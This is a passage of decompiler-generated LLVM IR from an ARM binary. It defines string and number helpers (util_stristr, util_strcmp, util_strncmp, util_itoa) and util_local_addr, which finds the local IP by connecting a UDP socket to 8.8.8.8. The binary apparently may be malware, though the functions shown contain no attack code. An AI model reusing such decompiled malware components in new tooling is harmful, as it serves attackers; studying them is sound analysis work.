.loopexit:                                        ; preds = %dec_label_pc_12770, %dec_label_pc_12788, %bb
  %v0_12790 = load i32, i32* @r7, align 4
  %v2_12794 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12794, i32* @r4, align 4
  store i32 %v6_12740, i32* @r5, align 4
  store i32 %v9_12740, i32* @r6, align 4
  store i32 %v12_12740, i32* @r7, align 4
  store i32 %v15_12740, i32* @r8, align 4
  ret i32 %v0_12790

; uselistorder directives
  uselistorder i32 %v5_1277c, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12788, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1279c = load i32, i32* @r4, align 4
  %v6_1279c = load i32, i32* @r5, align 4
  %v9_1279c = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_127ac = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_127b4 = inttoptr i32 %v0_127ac to i32*
  store i32 0, i32* %v2_127b4, align 4
  %v0_127c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_127c4 = call i32 @socket(i32 2, i32 2, i32 %v0_127c0)
  %v7_127c8 = icmp eq i32 %v3_127c4, -1
  store i32 %v3_127c4, i32* @r5, align 4
  br i1 %v7_127c8, label %bb, label %dec_label_pc_127d8

bb:                                               ; preds = %entry
  %v1_127d0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12824

dec_label_pc_127d8:                               ; preds = %entry
  %v2_127e4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_127e4, i32* @r4, align 4
  %v0_127f0 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_12804 = call i32 @__libc_connect(i32 %v3_127c4, i32 %v2_127e4, i32 %v0_127f0)
  store i32 %v2_127e4, i32* @r1, align 4
  %v2_1280c = ptrtoint i32* %stack_var_-20 to i32
  %v0_12810 = load i32, i32* @r5, align 4
  %v3_12814 = call i32 @__GI_getsockname(i32 %v0_12810, i32 %v2_127e4, i32 %v2_1280c)
  %v0_12818 = load i32, i32* @r5, align 4
  %v1_1281c = call i32 @__GI___libc_close(i32 %v0_12818)
  br label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %bb, %dec_label_pc_127d8
  %storemerge = phi i32 [ 134744072, %dec_label_pc_127d8 ], [ %v1_127d0, %bb ]
  store i32 %v3_1279c, i32* @r4, align 4
  store i32 %v6_1279c, i32* @r5, align 4
  store i32 %v9_1279c, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_127e4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_127c4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 134744072, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 17, 18, 15, 16, 2, 1, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 6, 5, 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_12824, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_12834 = load i8, i8* %tmp, align 1
  %v4_12834 = zext i8 %v3_12834 to i32
  store i32 %v4_12834, i32* @r3, align 4
  %v2_12838 = icmp eq i8 %v3_12834, 0
  br i1 %v2_12838, label %bb, label %dec_label_pc_1284c

bb:                                               ; preds = %entry
  br label %dec_label_pc_12860

dec_label_pc_1284c:                               ; preds = %entry
  br label %dec_label_pc_12850

dec_label_pc_12850:                               ; preds = %dec_label_pc_12850, %dec_label_pc_1284c
  %v0_12850 = phi i32 [ %v1_12850, %dec_label_pc_12850 ], [ 0, %dec_label_pc_1284c ]
  %v1_12850 = add i32 %v0_12850, 1
  %v2_12854 = add i32 %v1_12850, %arg2
  %v3_12854 = inttoptr i32 %v2_12854 to i8*
  %v4_12854 = load i8, i8* %v3_12854, align 1
  %v6_12854 = zext i8 %v4_12854 to i32
  store i32 %v6_12854, i32* @r3, align 4
  %v2_12858 = icmp eq i8 %v4_12854, 0
  br i1 %v2_12858, label %dec_label_pc_12860, label %dec_label_pc_12850

dec_label_pc_12860:                               ; preds = %dec_label_pc_12850, %bb
  %v0_128a421 = phi i32 [ %v4_12834, %bb ], [ %v1_12850, %dec_label_pc_12850 ]
  %v0_128682 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_128682, 1
  br i1 %tmp29, label %dec_label_pc_128b8, label %dec_label_pc_12874

dec_label_pc_12874:                               ; preds = %dec_label_pc_12860, %dec_label_pc_12868.backedge
  %v0_1286c.in = phi i32 [ %v0_1286c, %dec_label_pc_12868.backedge ], [ %v0_128682, %dec_label_pc_12860 ]
  %v1_12880 = phi i32 [ %v1_1288015, %dec_label_pc_12868.backedge ], [ 0, %dec_label_pc_12860 ]
  %v0_12874 = phi i32 [ %v5_12874, %dec_label_pc_12868.backedge ], [ %tmp23, %dec_label_pc_12860 ]
  %v0_1286c = add i32 %v0_1286c.in, -1
  %v1_12874 = inttoptr i32 %v0_12874 to i8*
  %v2_12874 = load i8, i8* %v1_12874, align 1
  %v3_12874 = zext i8 %v2_12874 to i32
  store i32 %v3_12874, i32* @ip, align 4
  %v5_12874 = add i32 %v0_12874, 1
  %v1_12878 = add nsw i32 %v3_12874, -65
  %v2_12880 = add i32 %v1_12880, %arg2
  %v3_12880 = inttoptr i32 %v2_12880 to i8*
  %v4_12880 = load i8, i8* %v3_12880, align 1
  %v6_12880 = zext i8 %v4_12880 to i32
  store i32 %v6_12880, i32* @r3, align 4
  %v1_12884 = add nsw i32 %v6_12880, -65
  %tmp38 = icmp ult i32 %v1_12878, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_12874
  %v5_12888 = or i32 %v3_12874, 96
  store i32 %v5_12888, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_12874, %bb30
  %v0_12894 = phi i32 [ %v3_12874, %dec_label_pc_12874 ], [ %v5_12888, %bb30 ]
  %tmp39 = icmp ult i32 %v1_12884, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_12890 = or i32 %v6_12880, 96
  store i32 %v5_12890, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_12894 = phi i32 [ %v6_12880, %bb31 ], [ %v5_12890, %bb32 ]
  %v9_12894 = icmp eq i32 %v0_12894, %v1_12894
  br i1 %v9_12894, label %dec_label_pc_128a0, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_12868.backedge

dec_label_pc_12868.backedge:                      ; preds = %bb34, %dec_label_pc_128a0
  %v1_1288015 = phi i32 [ 0, %bb34 ], [ %v1_128a0, %dec_label_pc_128a0 ]
  %tmp35 = icmp slt i32 %v0_1286c, 1
  br i1 %tmp35, label %dec_label_pc_128b8, label %dec_label_pc_12874

dec_label_pc_128a0:                               ; preds = %bb33
  %v1_128a0 = add i32 %v1_12880, 1
  %v9_128a4 = icmp eq i32 %v0_128a421, %v1_128a0
  br i1 %v9_128a4, label %dec_label_pc_128ac, label %dec_label_pc_12868.backedge

dec_label_pc_128ac:                               ; preds = %dec_label_pc_128a0
  %v2_128ac = sub i32 %v5_12874, %tmp23
  br label %dec_label_pc_128b8

dec_label_pc_128b8:                               ; preds = %dec_label_pc_12868.backedge, %dec_label_pc_12860, %dec_label_pc_128ac
  %storemerge = phi i32 [ %v2_128ac, %dec_label_pc_128ac ], [ -1, %dec_label_pc_12860 ], [ -1, %dec_label_pc_12868.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_128a0, { 1, 0 }
  uselistorder i32 %v0_12874, { 1, 0 }
  uselistorder i32 %v1_12880, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_128b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12868.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_12874, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_128c0 = load i8, i8* %arg1, align 1
  %v2_128c4 = icmp eq i8 %v2_128c0, 0
  br i1 %v2_128c4, label %bb, label %dec_label_pc_128d0

bb:                                               ; preds = %entry
  %v3_128c0 = zext i8 %v2_128c0 to i32
  br label %dec_label_pc_128e4

dec_label_pc_128d0:                               ; preds = %entry
  br label %dec_label_pc_128d4

dec_label_pc_128d4:                               ; preds = %dec_label_pc_128d4, %dec_label_pc_128d0
  %v0_128d4 = phi i32 [ %v1_128d4, %dec_label_pc_128d4 ], [ 0, %dec_label_pc_128d0 ]
  %v1_128d4 = add i32 %v0_128d4, 1
  %v2_128d8 = add i32 %v1_128d4, %tmp
  %v3_128d8 = inttoptr i32 %v2_128d8 to i8*
  %v4_128d8 = load i8, i8* %v3_128d8, align 1
  %v2_128dc = icmp eq i8 %v4_128d8, 0
  br i1 %v2_128dc, label %dec_label_pc_128e4, label %dec_label_pc_128d4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128d4, %bb
  %v0_129303 = phi i32 [ %v3_128c0, %bb ], [ %v1_128d4, %dec_label_pc_128d4 ]
  %v1_128e4 = inttoptr i32 %arg2 to i8*
  %v2_128e4 = load i8, i8* %v1_128e4, align 1
  %v2_128e8 = icmp eq i8 %v2_128e4, 0
  br i1 %v2_128e8, label %bb21, label %dec_label_pc_128f4

bb21:                                             ; preds = %dec_label_pc_128e4
  %v3_128e4 = zext i8 %v2_128e4 to i32
  br label %dec_label_pc_12908

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128e4
  br label %dec_label_pc_128f8

dec_label_pc_128f8:                               ; preds = %dec_label_pc_128f8, %dec_label_pc_128f4
  %v0_128f8 = phi i32 [ %v1_128f8, %dec_label_pc_128f8 ], [ 0, %dec_label_pc_128f4 ]
  %v1_128f8 = add i32 %v0_128f8, 1
  %v2_128fc = add i32 %v1_128f8, %arg2
  %v3_128fc = inttoptr i32 %v2_128fc to i8*
  %v4_128fc = load i8, i8* %v3_128fc, align 1
  %v2_12900 = icmp eq i8 %v4_128fc, 0
  br i1 %v2_12900, label %dec_label_pc_12908, label %dec_label_pc_128f8

dec_label_pc_12908:                               ; preds = %dec_label_pc_128f8, %bb21
  %v0_12908 = phi i32 [ %v3_128e4, %bb21 ], [ %v1_128f8, %dec_label_pc_128f8 ]
  %v9_12908 = icmp eq i32 %v0_12908, %v0_129303
  br i1 %v9_12908, label %dec_label_pc_12930.preheader, label %dec_label_pc_12910

dec_label_pc_12930.preheader:                     ; preds = %dec_label_pc_12908
  %v2_129305 = icmp eq i32 %v0_129303, 0
  br i1 %v2_129305, label %dec_label_pc_12938, label %dec_label_pc_12918

dec_label_pc_12910:                               ; preds = %dec_label_pc_12918, %dec_label_pc_12908
  ret i32 0

dec_label_pc_12918:                               ; preds = %dec_label_pc_12928, %dec_label_pc_12930.preheader
  %v0_12930.in = phi i32 [ %v0_12930, %dec_label_pc_12928 ], [ %v0_129303, %dec_label_pc_12930.preheader ]
  %v0_1292c = phi i32 [ %v1_1292c, %dec_label_pc_12928 ], [ %arg2, %dec_label_pc_12930.preheader ]
  %v0_12928 = phi i32 [ %v1_12928, %dec_label_pc_12928 ], [ %tmp, %dec_label_pc_12930.preheader ]
  %v0_12930 = add i32 %v0_12930.in, -1
  %v1_12918 = inttoptr i32 %v0_12928 to i8*
  %v2_12918 = load i8, i8* %v1_12918, align 1
  %v1_1291c = inttoptr i32 %v0_1292c to i8*
  %v2_1291c = load i8, i8* %v1_1291c, align 1
  %v9_12920 = icmp eq i8 %v2_12918, %v2_1291c
  br i1 %v9_12920, label %dec_label_pc_12928, label %dec_label_pc_12910

dec_label_pc_12928:                               ; preds = %dec_label_pc_12918
  %v1_12928 = add i32 %v0_12928, 1
  %v1_1292c = add i32 %v0_1292c, 1
  %v2_12930 = icmp eq i32 %v0_12930, 0
  br i1 %v2_12930, label %dec_label_pc_12938, label %dec_label_pc_12918

dec_label_pc_12938:                               ; preds = %dec_label_pc_12928, %dec_label_pc_12930.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_128e4, { 1, 0 }
  uselistorder i8 %v2_128c0, { 1, 0 }
}

define i32 @util_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12944 = load i8, i8* %arg1, align 1
  %v2_12948 = icmp eq i8 %v2_12944, 0
  %v0_1294c = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_12948, label %bb, label %dec_label_pc_12958

bb:                                               ; preds = %entry
  %v3_12944 = zext i8 %v2_12944 to i32
  br label %dec_label_pc_1296c

dec_label_pc_12958:                               ; preds = %entry
  br label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_1295c, %dec_label_pc_12958
  %v0_1295c = phi i32 [ %v1_1295c, %dec_label_pc_1295c ], [ 0, %dec_label_pc_12958 ]
  %v1_1295c = add i32 %v0_1295c, 1
  %v2_12960 = add i32 %v1_1295c, %tmp
  %v3_12960 = inttoptr i32 %v2_12960 to i8*
  %v4_12960 = load i8, i8* %v3_12960, align 1
  %v2_12964 = icmp eq i8 %v4_12960, 0
  br i1 %v2_12964, label %dec_label_pc_1296c, label %dec_label_pc_1295c

dec_label_pc_1296c:                               ; preds = %dec_label_pc_1295c, %bb
  %v6_12994 = phi i32 [ %v3_12944, %bb ], [ %v1_1295c, %dec_label_pc_1295c ]
  %v0_1296c = load i32, i32* %r1.global-to-local, align 4
  %v1_1296c = inttoptr i32 %v0_1296c to i8*
  %v2_1296c = load i8, i8* %v1_1296c, align 1
  %v3_1296c = zext i8 %v2_1296c to i32
  %v2_12970 = icmp eq i8 %v2_1296c, 0
  br i1 %v2_12970, label %bb26, label %dec_label_pc_1297c

bb26:                                             ; preds = %dec_label_pc_1296c
  store i32 %v3_1296c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12990

dec_label_pc_1297c:                               ; preds = %dec_label_pc_1296c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_12980, %dec_label_pc_1297c
  %v0_12980 = phi i32 [ %v1_12980, %dec_label_pc_12980 ], [ 0, %dec_label_pc_1297c ]
  %v1_12980 = add i32 %v0_12980, 1
  store i32 %v1_12980, i32* %r2.global-to-local, align 4
  %v2_12984 = add i32 %v1_12980, %v0_1296c
  %v3_12984 = inttoptr i32 %v2_12984 to i8*
  %v4_12984 = load i8, i8* %v3_12984, align 1
  %v2_12988 = icmp eq i8 %v4_12984, 0
  br i1 %v2_12988, label %dec_label_pc_12990, label %dec_label_pc_12980

dec_label_pc_12990:                               ; preds = %dec_label_pc_12980, %bb26
  %v0_12990 = phi i32 [ %v3_1296c, %bb26 ], [ %v1_12980, %dec_label_pc_12980 ]
  %v2_12990 = sub i32 %v0_12990, %v0_1294c
  %v4_12990 = xor i32 %v0_12990, %v0_1294c
  %v5_12990 = xor i32 %v2_12990, %v0_12990
  %v6_12990 = and i32 %v5_12990, %v4_12990
  %v5_12994 = icmp slt i32 %v0_12990, %v0_1294c
  br i1 %v5_12994, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_12990
  %v8_12994 = sub i32 %v6_12994, %v0_1294c
  %v10_12994 = xor i32 %v6_12994, %v0_1294c
  %v11_12994 = xor i32 %v8_12994, %v6_12994
  %v12_12994 = and i32 %v11_12994, %v10_12994
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_12990, %bb27
  %v1_12998.in = phi i32 [ %v6_12990, %dec_label_pc_12990 ], [ %v12_12994, %bb27 ]
  %v0_12998.in = phi i32 [ %v2_12990, %dec_label_pc_12990 ], [ %v8_12994, %bb27 ]
  %v0_12998 = icmp slt i32 %v0_12998.in, 0
  %v1_12998 = icmp slt i32 %v1_12998.in, 0
  %v2_12998 = xor i1 %v1_12998, %v0_12998
  br i1 %v2_12998, label %dec_label_pc_129c4, label %dec_label_pc_129a8.preheader

dec_label_pc_129a8.preheader:                     ; preds = %bb28
  %v2_129a85 = icmp eq i32 %v0_1294c, 0
  br i1 %v2_129a85, label %dec_label_pc_129c4, label %dec_label_pc_129b0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_129b0
  %v1_129a0 = add i32 %v0_129a0, 1
  %v1_129a4 = add i32 %v0_129a4, 1
  store i32 %v1_129a4, i32* %r1.global-to-local, align 4
  %v2_129a8 = icmp eq i32 %v0_129a8, 0
  br i1 %v2_129a8, label %dec_label_pc_129c4, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129a0, %dec_label_pc_129a8.preheader
  %v0_129a8.in = phi i32 [ %v0_129a8, %dec_label_pc_129a0 ], [ %v0_1294c, %dec_label_pc_129a8.preheader ]
  %v0_129a4 = phi i32 [ %v1_129a4, %dec_label_pc_129a0 ], [ %v0_1296c, %dec_label_pc_129a8.preheader ]
  %v0_129a0 = phi i32 [ %v1_129a0, %dec_label_pc_129a0 ], [ %tmp, %dec_label_pc_129a8.preheader ]
  %v0_129a8 = add i32 %v0_129a8.in, -1
  %v1_129b0 = inttoptr i32 %v0_129a0 to i8*
  %v2_129b0 = load i8, i8* %v1_129b0, align 1
  %v3_129b0 = zext i8 %v2_129b0 to i32
  store i32 %v3_129b0, i32* %r2.global-to-local, align 4
  %v1_129b4 = inttoptr i32 %v0_129a4 to i8*
  %v2_129b4 = load i8, i8* %v1_129b4, align 1
  %v9_129b8 = icmp eq i8 %v2_129b0, %v2_129b4
  br i1 %v9_129b8, label %dec_label_pc_129a0, label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %dec_label_pc_129a0, %dec_label_pc_129a8.preheader, %dec_label_pc_129b0, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_129a8.preheader ], [ 1, %dec_label_pc_129a0 ], [ 0, %dec_label_pc_129b0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_129a0, { 1, 0 }
  uselistorder i32 %v0_129a4, { 1, 0 }
  uselistorder i32 %v0_12990, { 3, 0, 1, 2 }
  uselistorder i32 %v1_12980, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1294c, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_12944, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_129c4, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_129d8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_129d8, i32* %r8.global-to-local, align 4
  %v2_129d8 = icmp eq i32 %v0_129d8, 0
  store i1 %v2_129d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_129d8, label %dec_label_pc_12ab8, label %dec_label_pc_129e8

dec_label_pc_129e8:                               ; preds = %entry
  %v3_129e8 = icmp eq i8 %arg1, 0
  store i1 %v3_129e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_129e8, label %.thread, label %dec_label_pc_129fc

.thread:                                          ; preds = %dec_label_pc_129e8
  %v4_129f0 = inttoptr i32 %v0_129d8 to i8*
  store i8 48, i8* %v4_129f0, align 1
  %v0_129f4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_129f4.pr.pr, label %.thread1, label %dec_label_pc_129fc

.thread1:                                         ; preds = %.thread
  %v4_129f4 = load i32, i32* %r8.global-to-local, align 4
  %v5_129f4 = add i32 %v4_129f4, 1
  %v6_129f4 = inttoptr i32 %v5_129f4 to i8*
  store i8 0, i8* %v6_129f4, align 1
  %v0_129f8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_129f8.pr.pr, label %dec_label_pc_12ab8, label %dec_label_pc_129fc

dec_label_pc_129fc:                               ; preds = %dec_label_pc_129e8, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_12a00 = icmp eq i32 %arg2, 10
  store i1 %v7_12a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a00, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_129fc
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_129fc
  %v4_129fc = zext i1 %tmp48 to i32
  store i32 %v4_129fc, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_12a208 = sub nsw i32 0, %tmp
  %tmp.v3_12a208 = select i1 %phitmp, i32 %tmp, i32 %v3_12a208
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_12a208, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_12a2c = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_12a2c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12a30

dec_label_pc_12a30:                               ; preds = %bb46, %.thread6
  %v2_12a50 = phi i32 [ %v1_12a5c, %bb46 ], [ 32, %.thread6 ]
  %v0_12a44 = phi i32 [ %v2_12a54, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_12a34 = load i32, i32* %r6.global-to-local, align 4
  %v3_12a38 = urem i32 %v0_12a44, %v0_12a34
  store i32 %v3_12a38, i32* %r1.global-to-local, align 4
  %v7_12a3c = icmp eq i32 %v3_12a38, 9
  store i1 %v7_12a3c, i1* %cpsr_z.global-to-local, align 1
  %v1_12a40 = add i32 %v3_12a38, 48
  store i32 %v0_12a44, i32* %r0.global-to-local, align 4
  %v7_12a48 = icmp sgt i32 %v3_12a38, 9
  %extract.t = trunc i32 %v1_12a40 to i8
  br i1 %v7_12a48, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_12a30
  %v9_12a48 = add i32 %v3_12a38, 55
  %extract.t28 = trunc i32 %v9_12a48 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_12a30, %bb45
  %v0_12a50.off0 = phi i8 [ %extract.t, %dec_label_pc_12a30 ], [ %extract.t28, %bb45 ]
  store i32 %v0_12a34, i32* %r1.global-to-local, align 4
  %v3_12a50 = load i32, i32* %r7.global-to-local, align 4
  %v4_12a50 = add i32 %v3_12a50, %v2_12a50
  %v5_12a50 = inttoptr i32 %v4_12a50 to i8*
  store i8 %v0_12a50.off0, i8* %v5_12a50, align 1
  %v0_12a54 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a54 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a54 = udiv i32 %v0_12a54, %v1_12a54
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  %v2_12a58 = icmp ugt i32 %v1_12a54, %v0_12a54
  store i1 %v2_12a58, i1* %cpsr_z.global-to-local, align 1
  %v0_12a5c = load i32, i32* %r5.global-to-local, align 4
  %v1_12a5c = add i32 %v0_12a5c, -1
  store i32 %v1_12a5c, i32* %r5.global-to-local, align 4
  br i1 %v2_12a58, label %dec_label_pc_12a64, label %dec_label_pc_12a30

dec_label_pc_12a64:                               ; preds = %bb46
  %v0_12a64 = load i32, i32* %sl.global-to-local, align 4
  %v2_12a64 = icmp eq i32 %v0_12a64, 0
  store i1 %v2_12a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a64, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12a64
  %v3_12a68 = ptrtoint i32* %stack_var_-32 to i32
  %v3_12a6c = add i32 %v1_12a5c, %v3_12a68
  store i32 %v3_12a6c, i32* %r2.global-to-local, align 4
  %v4_12a74 = add i32 %v3_12a6c, -34
  %v5_12a74 = inttoptr i32 %v4_12a74 to i8*
  store i8 45, i8* %v5_12a74, align 1
  %v0_12a78.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_12a78.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_12a78.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_12a64
  %v1_12a78 = phi i32 [ %v1_12a5c, %dec_label_pc_12a64 ], [ %v1_12a78.pre, %.thread11 ]
  %v2_12a78 = add i32 %v1_12a78, 1
  store i32 %v2_12a78, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_12a84 = phi i32 [ %v2_12a78, %.thread12 ], [ %v1_12a78.pre, %.thread11 ]
  %v0_12a7c = load i32, i32* %r7.global-to-local, align 4
  %v2_12a7c = add i32 %v0_12a7c, %v1_12a84
  %v3_12a7c = inttoptr i32 %v2_12a7c to i8*
  %v4_12a7c = load i8, i8* %v3_12a7c, align 1
  %v6_12a7c = zext i8 %v4_12a7c to i32
  %v2_12a80 = icmp eq i8 %v4_12a7c, 0
  store i1 %v2_12a80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_12a7c, i32* %r2.global-to-local, align 4
  br i1 %v2_12a80, label %dec_label_pc_12ac8, label %dec_label_pc_12a90.preheader

dec_label_pc_12a90.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12a90

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a90.preheader, %dec_label_pc_12a90
  %v0_12a90 = phi i32 [ 0, %dec_label_pc_12a90.preheader ], [ %v1_12a90, %dec_label_pc_12a90 ]
  %v1_12a90 = add i32 %v0_12a90, 1
  store i32 %v1_12a90, i32* %r1.global-to-local, align 4
  %v2_12a94 = add i32 %v1_12a90, %v2_12a7c
  %v3_12a94 = inttoptr i32 %v2_12a94 to i8*
  %v4_12a94 = load i8, i8* %v3_12a94, align 1
  %v2_12a98 = icmp eq i8 %v4_12a94, 0
  store i1 %v2_12a98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a98, label %dec_label_pc_12aa0, label %dec_label_pc_12a90

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a90, %dec_label_pc_12ac8
  %v0_12aa425 = phi i32 [ %v6_12a7c, %dec_label_pc_12ac8 ], [ %v1_12a90, %dec_label_pc_12a90 ]
  %v0_12aa0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12aa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12aa4

dec_label_pc_12aa4:                               ; preds = %dec_label_pc_12aa4.dec_label_pc_12aa4_crit_edge, %dec_label_pc_12aa0
  %v2_12ab0 = phi i32 [ %v5_12ab0, %dec_label_pc_12aa4.dec_label_pc_12aa4_crit_edge ], [ %v0_12aa0, %dec_label_pc_12aa0 ]
  %v0_12aa8 = phi i32 [ %v0_12aa8.pre, %dec_label_pc_12aa4.dec_label_pc_12aa4_crit_edge ], [ %v2_12a7c, %dec_label_pc_12aa0 ]
  %v0_12aa4 = phi i32 [ %v0_12aa4.pre, %dec_label_pc_12aa4.dec_label_pc_12aa4_crit_edge ], [ %v0_12aa425, %dec_label_pc_12aa0 ]
  %v1_12aa4 = add i32 %v0_12aa4, -1
  store i32 %v1_12aa4, i32* %r1.global-to-local, align 4
  %v1_12aa8 = inttoptr i32 %v0_12aa8 to i8*
  %v2_12aa8 = load i8, i8* %v1_12aa8, align 1
  %v5_12aa8 = add i32 %v0_12aa8, 1
  store i32 %v5_12aa8, i32* %r2.global-to-local, align 4
  %v3_12aac = icmp eq i32 %v0_12aa4, 0
  store i1 %v3_12aac, i1* %cpsr_z.global-to-local, align 1
